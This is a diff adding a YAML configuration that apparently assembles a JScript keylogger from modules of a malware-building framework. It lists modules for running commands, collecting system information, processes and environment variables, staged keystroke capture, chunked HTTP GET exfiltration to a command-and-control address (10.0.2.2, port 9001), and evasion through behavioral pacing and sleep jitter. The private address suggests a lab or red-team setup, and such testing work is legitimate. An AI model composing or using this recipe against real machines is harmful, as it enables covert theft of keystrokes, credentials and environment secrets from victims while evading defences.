@@ -1,0 +1,27 @@
+name: js_keylogger_chunked
+description: JScript keylogger with chunked HTTP GET exfiltration
+format: jscript
+
+core:
+  - core/emit_buffer
+  - core/run_cmd
+  - core/file_ops
+
+collectors:
+  - collectors/sysinfo
+  - collectors/processes
+  - collectors/env_vars
+
+keylogger: collectors/keylogger_staged
+
+exfil: exfil/http_get_chunks
+arch: arch/keylogger
+
+evasion:
+  - evasion/behavioral_pacing
+  - evasion/sleep_jitter
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
+  KEYLOG_DURATION: "30"
